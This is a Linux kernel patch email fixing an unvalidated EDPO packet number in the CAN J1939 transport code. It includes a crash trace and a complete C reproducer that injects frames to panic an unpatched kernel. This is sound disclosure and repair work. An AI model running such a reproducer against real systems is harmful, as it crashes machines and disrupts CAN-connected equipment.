Received: from m16.mail.163.com (m16.mail.163.com [117.135.210.3])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B12933451B5;
	Wed, 30 Sep 2026 06:00:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=117.135.210.3
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790748015; cv=none; b=q/xAEooSpoIrHfJw7jffSr2MBdbFtp3zmKvTsdWXLpgDoNBWO9BKRi/ywqf6dJSJGkJKexEFNevozYhfis51dIl6Y255KxVMChFoaAX8zyAkjvKExYKubS8CZB6hS11AMb8nPHqgjqSeTNEcGVi3H7h0bG2cqnkLDdWlfgeRTEg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790748015; c=relaxed/simple;
	bh=qREdSemqFZXx4V43QDQhumpXm4Q5Iu327Qm3y6Vb2vk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=drBtWGzmiGtdPVZTx1zFJpdT/5STaXvAaCcvaXKvVm5pUQYPFGN8as6hPKoHT5jSz14tq4j9if4oddRXz72TJTkCefDGL7K60X4Qbw6+FkxQHPoW4wkpkUwH5IE2mKUuyo7BlssySeq3BC6HtCNaz2GKUzCcU2c6ruMNKcPUoA0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com; spf=pass smtp.mailfrom=163.com; dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b=gmUjv/q0; arc=none smtp.client-ip=117.135.210.3
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=163.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b="gmUjv/q0"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
	s=s110527; h=From:To:Subject:Date:Message-ID:MIME-Version; bh=Hi
	S8EDNgS6vblpmoKpwkEPjRNgR0zxheEaICi11jsmI=; b=gmUjv/q0+kb4aFkrDx
	Iu1k4axPtlr0VIhIvD4jp3g5Lh8c0ih2k9/2GkidzFBq4QUmkcjIXwzSov3vNA33
	saG0quOtWKniFHiA7ozhsR6zgLPRvW+J9wmHf0VdAD6nBxUu0wLjHKS174qRX28d
	iTgg8Epm388N2tDjyeDlkg5Lk=
Received: from chaosheng-ASUS-TUF-Gaming-F16-FX607JV-FX607JV.lan (unknown [])
	by gzsmtp3 (Coremail) with SMTP id PigvCgDnV+ZOpbxqsre3CA--.40759S2;
	Wed, 30 Sep 2026 13:59:43 +0800 (CST)
From: Chaosheng Qu <quchaosheng000406@163.com>
To: Robin van der Gracht <robin@protonic.nl>,
	Oleksij Rempel <o.rempel@pengutronix.de>,
	kernel@pengutronix.de
Cc: Chaosheng Qu <quchaosheng000406@163.com>,
	Oliver Hartkopp <socketcan@hartkopp.net>,
	Marc Kleine-Budde <mkl@pengutronix.de>,
	linux-can@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [PATCH net v2 RESEND] can: j1939: validate the EDPO packet number
Date: Wed, 30 Sep 2026 13:59:42 +0800
Message-ID: <20260930055942.216879-1-quchaosheng000406@163.com>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-can@vger.kernel.org
List-Id: <linux-can.vger.kernel.org>
List-Subscribe: <mailto:linux-can+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CM-TRANSID:PigvCgDnV+ZOpbxqsre3CA--.40759S2
X-Coremail-Antispam: 1Uf129KBjvAXoW3Cr1rCF4UXF4xWry5uF1kAFb_yoW8GF4xKo
	WfZa15Jw45Kw1xtF18Wr1rJr98Z3W09rn8Xrs0v390van8XF4Igw1Iq3W5C393tr4kKFZx
	Za97tr9rXw4xK3s3n29KB7ZKAUJUUUU8529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
	AaLaJ3UbIYCTnIWIevJa73UjIFyTuYvjTRNF4EUUUUU
X-CM-SenderInfo: xtxfxtprvkv0bjqqikiqw6il2tof0z/xtbDAA9Gu2q8pU8kNgAA3c


ETP.CM_DPO is peer controlled and its packet number is accepted without
any validation.  It names the packet a transmission window starts at, and
j1939_xtp_rx_dat_one() places incoming data at "dat[0] - 1 + pkt.dpo", so
a value past the end of the message moves pkt.dpo beyond the reassembled
buffer.

The transfer still completes normally in that case.  With
pkt.dpo == pkt.total, a closing ETP.DT frame with dat[0] == 0 evaluates to
packet pkt.total - 1, which is the last in-order packet, so pkt.rx reaches
pkt.total and the receiver emits its own EOMA.  The local loopback of that
EOMA runs j1939_session_completed(), which asks
j1939_session_skb_get() for offset "pkt.dpo * 7" -- one full packet past
the end of the queued skb -- gets NULL, and passes it straight to
j1939_sk_recv(), which dereferences oskb->sk.

The trigger is deterministic and needs no hardware, no race and no memory
pressure.  Nothing on the path checks a capability: net/can has no
CAP_NET_RAW check at all, CAN_J1939 does not require one, and the only
capability gate nearby is SO_J1939_SEND_PRIO < 2, which asks for
CAP_NET_ADMIN and is not needed here.  Given a CAN interface -- the vcan
used below only has to be created once, which normally needs privileges --
any user can reach this:

  ETP.CM_RTS (size 1786)  -> total = 256 packets
  ETP.CM_DPO (packet 0)
  ETP.DT seq 1..255       -> packets 0..254, pkt.rx = 255
  ETP.CM_DPO (packet 256) -> pkt.dpo = 256, unvalidated
  ETP.DT seq 0            -> packet 255 == pkt.rx, completes the transfer

resulting in:

  BUG: kernel NULL pointer dereference, address: 0000000000000018
  RIP: 0010:j1939_sk_recv+0xaf/0x150
  Call Trace:
   <IRQ>
   j1939_session_completed+0x69/0x80
   j1939_xtp_rx_eoma+0xc1/0x170
   j1939_tp_recv+0x41b/0x4c0
   j1939_can_recv+0x1ad/0x290
  Kernel panic - not syncing: Fatal exception in interrupt

Reject an EDPO that names a packet at or past pkt.total and abort the
session with J1939_XTP_ABORT_BAD_EDPO_OFFSET, the SAE J1939-21 abort code
for exactly this case.  The check has to be ">=" and not ">": pkt.total is
a packet count, so the last valid packet is pkt.total - 1 and
"dpo == pkt.total" is already out of range -- it is the value used by the
trigger above.

Both roles tolerate the check because a transmitter derives the offset
from pkt.tx_acked, which is "cts_packet - 1" with cts_packet <= pkt.total,
so the largest value it ever announces is pkt.total - 1.

Also guard j1939_session_completed() against a NULL skb as defense in
depth, so that any future regression in the offset arithmetic degrades to
a dropped message instead of a kernel panic.  The only other caller of
j1939_session_skb_get(), j1939_simple_txnext(), already does this.

A self-contained reproducer follows below the fold.  It builds with
"gcc -static -O2 -o j1939_dpo j1939_dpo.c", needs one vcan interface and no
other setup, and prints the frame sequence as it injects it.  It uses a raw
socket for the sender so it does not need a J1939 stack of its own.  On
v7.3.0-rc5 under QEMU:

  - an unpatched kernel panics 3 out of 3 runs, in j1939_sk_recv():
      BUG: kernel NULL pointer dereference, address: 0000000000000018
      RIP: 0010:j1939_sk_recv+0xaf/0x150
  - with only the NULL guard in j1939_session_completed() (i.e. without
    the EDPO range check) it still panics 3 out of 3 runs, so the guard
    alone does not close the hole and the range check is the actual fix
  - with this patch applied it is 0 out of 3 and the session is aborted
    with J1939_XTP_ABORT_BAD_EDPO_OFFSET as intended
  - a full 1786 byte ETP transfer between two J1939 sockets still
    completes with the payload intact.  That transfer announces
    pkt.total - 1 in its last EDPO, so it exercises the boundary value
    one below the rejected one, and it runs the transmitter's own EDPO
    through the vcan loopback as well.

Fixes: 9d71dd0c7009 ("can: add support of SAE J1939 protocol")
Assisted-by: LLM
Signed-off-by: Chaosheng Qu <quchaosheng000406@163.com>
---
Resend: the first posting of this v2 went out without the list Cc and is
not in the archives, so it is repeated here for the record.

Changes in v2:
 - Add the reproducer that was missing from v1.  It is self contained,
   needs one vcan interface, and was run against three kernels: the
   unpatched one panics 3/3, a kernel with only the NULL guard still
   panics 3/3, and this patch gives 0/3.  The middle result is the
   interesting one: it shows the guard alone does not close the hole, so
   the range check is not redundant with it.
 - Reword the reachability claim.  v1 said "unprivileged user"; the only
   capability on the path is the one behind SO_J1939_SEND_PRIO < 2, and
   the vcan interface itself has to exist first.  What is true is that
   nothing in the receive path the frames take checks a capability.
 - Resent as v2 rather than a ping: the payload of the mail changed.

Reproducer (userspace, vcan only):

    // SPDX-License-Identifier: GPL-2.0
    /*
     * net/can/j1939: ETP.CM_DPO is accepted without validation.
     *
     * ETP splits a transfer into windows; the sender announces each window with
     * an ETP.CM_DPO and j1939_xtp_rx_dat_one() places data at
     * "dat[0] - 1 + session->pkt.dpo".  pkt.dpo is therefore a window base, and a
     * peer that sets it to pkt.total makes the *last* in-order packet land at
     * offset pkt.total * 7 -- one packet past the end of the reassembled buffer.
     *
     * The packet counter still reaches pkt.total, so the transfer completes
     * normally: the receiver schedules its own ETP.CM_EOMA, the local loopback of
     * that EOMA is delivered to j1939_xtp_rx_eoma_one(), and
     * j1939_session_completed() then asks j1939_session_skb_get() for offset
     * "pkt.dpo * 7" == total * 7.  The lookup walks past the queued skb, comes up
     * empty, and the resulting NULL is handed to j1939_sk_recv(), which
     * dereferences it (oskb->sk).
     *
     * Sequence (all frames SA 0x80 -> DA 0x90, ETP.CM on PGN 0xc800):
     *
     *   ETP.CM_RTS (1786 bytes) -> total = 256 packets
     *   ETP.CM_DPO (packet 0)
     *   ETP.DT seq 1..255       -> packets 0..254, pkt.rx = 255
     *   ETP.CM_DPO (packet 256) -> pkt.dpo = 256, unvalidated
     *   ETP.DT seq 0            -> "0 - 1 + 256" == packet 255 == pkt.rx,
     *                              which completes the transfer
     *
     * Build: gcc -static -O2 -o j1939_dpo j1939_dpo.c
     * Run:   ip link set vcan0 up && ./j1939_dpo vcan0
     */
    #include <linux/can.h>
    #include <linux/can/j1939.h>
    #include <linux/can/raw.h>
    #include <net/if.h>
    #include <sys/ioctl.h>
    #include <stdio.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <sys/time.h>
    #include <unistd.h>

    #define ETP_RTS	0x14
    #define ETP_CTS	0x15
    #define ETP_DPO	0x16
    #define ETP_EOMA 0x17

    #define PGN_ETP_CTL 0xc800
    #define SA 0x80
    #define DA 0x90

    #define MSG_SIZE 1786
    #define TOTAL	  ((MSG_SIZE + 6) / 7)	/* 256 */

    static canid_t j1939_id(unsigned char pf, unsigned char ps, unsigned char sa)
    {
    	/* j1939 registers CAN_EFF_FLAG as its filter mask, so every frame on
    	 * the bus has to be an extended (29 bit) frame.
    	 */
    	return CAN_EFF_FLAG | ((canid_t)6 << 26) | ((canid_t)pf << 16) |
    	       ((canid_t)ps << 8) | sa;
    }

    static int spkt = -1;

    static void send_frame(canid_t id, const unsigned char *d, int len)
    {
    	struct can_frame cf = { 0 };

    	cf.can_id = id;
    	cf.len = len;
    	memcpy(cf.data, d, len);
    	if (send(spkt, &cf, sizeof(cf), 0) != sizeof(cf))
    		perror("send");
    }

    static int recv_frame(canid_t *id, unsigned char *d, int timeout_ms)
    {
    	struct can_frame cf;
    	struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
    	fd_set rfds;

    	FD_ZERO(&rfds);
    	FD_SET(spkt, &rfds);
    	if (select(spkt + 1, &rfds, NULL, NULL, &tv) <= 0)
    		return -1;
    	if (recv(spkt, &cf, sizeof(cf), 0) != sizeof(cf))
    		return -1;
    	*id = cf.can_id;
    	memcpy(d, cf.data, 8);
    	return cf.len;
    }

    /* ETP.CM control frame: dat[5..7] always carries the PGN of the session the
     * command belongs to, otherwise j1939_xtp_rx_cmd_bad_pgn() drops it.
     */
    static void ctl(unsigned char cmd, unsigned int size, unsigned int pkt)
    {
    	unsigned char d[8] = { 0 };

    	d[0] = cmd;
    	if (cmd == ETP_DPO) {
    		d[2] = pkt >> 0;	/* 24 bit packet number, dat[2..4] */
    		d[3] = pkt >> 8;
    		d[4] = pkt >> 16;
    	} else {
    		d[1] = size >> 0;	/* 32 bit size, dat[1..4] */
    		d[2] = size >> 8;
    		d[3] = size >> 16;
    		d[4] = size >> 24;
    	}
    	d[5] = PGN_ETP_CTL & 0xff;
    	d[6] = (PGN_ETP_CTL >> 8) & 0xff;
    	d[7] = (PGN_ETP_CTL >> 16) & 0xff;
    	send_frame(j1939_id(0xC8, DA, SA), d, 8);
    }

    static void dt(unsigned char seq)
    {
    	unsigned char d[8] = { 0 };

    	d[0] = seq;
    	send_frame(j1939_id(0xC7, DA, SA), d, 8);
    }

    int main(int argc, char **argv)
    {
    	const char *ifname = argc > 1 ? argv[1] : "vcan0";
    	struct sockaddr_can addr = { 0 };
    	struct ifreq ifr = { 0 };
    	unsigned char d[8];
    	canid_t id;
    	int s, i, len, cts = 0;

    	/* The victim: an ordinary, correctly bound J1939 socket. */
    	s = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
    	if (s < 0) {
    		perror("socket J1939");
    		return 3;
    	}
    	addr.can_family = AF_CAN;
    	addr.can_ifindex = if_nametoindex(ifname);
    	addr.can_addr.j1939.name = J1939_NO_NAME;
    	addr.can_addr.j1939.pgn = J1939_NO_PGN;
    	addr.can_addr.j1939.addr = DA;
    	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    		perror("bind J1939");
    		return 3;
    	}
    	printf("victim: J1939 socket bound to 0x%02x on %s\n", DA, ifname);

    	/* The attacker: a raw injector with an arbitrary source address. */
    	spkt = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    	if (spkt < 0) {
    		perror("socket RAW");
    		return 3;
    	}
    	strncpy(ifr.ifr_name, ifname, sizeof(ifr.ifr_name) - 1);
    	if (ioctl(spkt, SIOCGIFINDEX, &ifr) < 0) {
    		perror("SIOCGIFINDEX");
    		return 3;
    	}
    	addr.can_family = AF_CAN;
    	addr.can_ifindex = ifr.ifr_ifindex;
    	if (bind(spkt, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    		perror("bind RAW");
    		return 3;
    	}
    	printf("attacker: raw socket on %s  sa=0x%02x da=0x%02x\n",
    	       ifname, SA, DA);

    	/* 1. ETP.CM_RTS -> the receiver answers with ETP.CM_CTS. */
    	ctl(ETP_RTS, MSG_SIZE, 0);
    	printf("-> ETP.CM_RTS size %u (total %u packets)\n", MSG_SIZE, TOTAL);

    	for (i = 0; i < 500 && !cts; i++) {
    		len = recv_frame(&id, d, 20);
    		if (len < 0)
    			continue;
    		if (d[0] == ETP_CTS) {
    			cts = 1;
    			printf("<- ETP.CM_CTS window %u first packet %u\n",
    			       d[1], d[2] | (d[3] << 8) | (d[4] << 16));
    		}
    	}
    	if (!cts) {
    		printf("no CTS, aborting\n");
    		return 4;
    	}

    	/* The vcan loopback delivers the receiver's own CTS back to its own
    	 * receive session and j1939_xtp_rx_cts_one() stores it in
    	 * session->last_cmd.  j1939_xtp_rx_dat_one() only accepts data when
    	 * last_cmd is 0xff (idle), ETP.CM_DPO or a TP.CM_* value, so every
    	 * window has to be re-opened with a DPO *after* the CTS has been
    	 * processed, never before it.
    	 */
    	usleep(200000);

    	/* 2. Window 1: DPO 0, then packets 0..254.  One packet is left over
    	 *    so the transfer is still short of completion.
    	 */
    	ctl(ETP_DPO, 0, 0);
    	printf("-> ETP.CM_DPO 0 (window base)\n");
    	for (i = 0; i < TOTAL - 1; i++)
    		dt((unsigned char)(i + 1));
    	printf("-> ETP.DT seq 1..%u (packets 0..%u)\n", TOTAL - 1, TOTAL - 2);
    	{
    		int n = 0;
    		while (n < 40 && recv_frame(&id, d, 20) >= 0) {
    			printf("<- (drain) cmd %02x\n", d[0]);
    			n++;
    		}
    		printf("<- drained %d frames, bus quiet\n", n);
    	}

    	/* 3. The vulnerable window.  pkt.dpo is peer controlled and nothing
    	 *    validates it against pkt.total, even though
    	 *    j1939_xtp_rx_dpo_one() has pkt.total right there.
    	 */
    	ctl(ETP_DPO, 0, TOTAL);
    	printf("-> ETP.CM_DPO %u  <== pkt.dpo == pkt.total, unvalidated\n",
    	       TOTAL);
    	usleep(50000);

    	/* 4. Closing DT.  "dat[0] - 1 + pkt.dpo" evaluates to 255 == pkt.rx,
    	 *    the skb lookup at 255 * 7 = 1785 is still inside the buffer, so
    	 *    the frame is accepted as the last in-order packet and pkt.rx
    	 *    reaches pkt.total.  The receiver now sends its own EOMA, whose
    	 *    loopback runs j1939_session_completed() with pkt.dpo == 256.
    	 */
    	dt(0);
    	printf("-> ETP.DT seq 0 (packet %u, completes the transfer)\n",
    	       TOTAL - 1);
    	usleep(300000);

    	printf("RESULT: sequence injected\n");
    	fflush(stdout);
    	close(s);
    	return 0;
    }

 net/can/j1939/transport.c | 29 +++++++++++++++++++++++++----
 1 file changed, 25 insertions(+), 4 deletions(-)

diff --git a/net/can/j1939/transport.c b/net/can/j1939/transport.c
index 8fcfd13e5..065b4f71e 100644
--- a/net/can/j1939/transport.c
+++ b/net/can/j1939/transport.c
@@ -1243,9 +1243,18 @@ static void j1939_session_completed(struct j1939_session *session)
 
 	if (!session->transmission) {
 		se_skb = j1939_session_skb_get(session);
-		/* distribute among j1939 receivers */
-		j1939_sk_recv(session->priv, se_skb);
-		consume_skb(se_skb);
+
+		/* The offset "pkt.dpo * 7" is not necessarily covered by a
+		 * queued skb, e.g. when a peer names a packet past the end of
+		 * the message in an EDPO.  j1939_simple_txnext() already
+		 * guards its call the same way; dropping the message is
+		 * better than handing a NULL skb to j1939_sk_recv().
+		 */
+		if (se_skb) {
+			/* distribute among j1939 receivers */
+			j1939_sk_recv(session->priv, se_skb);
+			consume_skb(se_skb);
+		}
 	}
 
 	j1939_session_deactivate_activate_next(session);
@@ -1823,14 +1832,34 @@ static void j1939_xtp_rx_dpo_one(struct j1939_session *session,
 				 struct sk_buff *skb)
 {
 	const u8 *dat = skb->data;
+	unsigned int dpo;
 
 	if (j1939_xtp_rx_cmd_bad_pgn(session, skb))
 		return;
 
 	netdev_dbg(session->priv->ndev, "%s: 0x%p\n", __func__, session);
 
+	dpo = j1939_etp_ctl_to_packet(dat);
+
+	/*
+	 * EDPO is peer controlled.  It names the packet the announced window
+	 * starts at, and j1939_xtp_rx_dat_one() places data at
+	 * "dat[0] - 1 + pkt.dpo", so it has to stay inside the message.  A
+	 * value past the end moves pkt.dpo beyond the reassembled buffer and
+	 * makes the ETP completion path look up offset "pkt.dpo * 7", which is
+	 * no longer covered by any queued skb.
+	 */
+	if (dpo >= session->pkt.total) {
+		netdev_warn(session->priv->ndev,
+			    "%s: 0x%p: EDPO %u out of range (total %u), aborting\n",
+			    __func__, session, dpo, session->pkt.total);
+		j1939_session_timers_cancel(session);
+		j1939_session_cancel(session, J1939_XTP_ABORT_BAD_EDPO_OFFSET);
+		return;
+	}
+
 	/* transmitted without problems */
-	session->pkt.dpo = j1939_etp_ctl_to_packet(skb->data);
+	session->pkt.dpo = dpo;
 	session->last_cmd = dat[0];
 	j1939_tp_set_rxtimeout(session, 750);
 

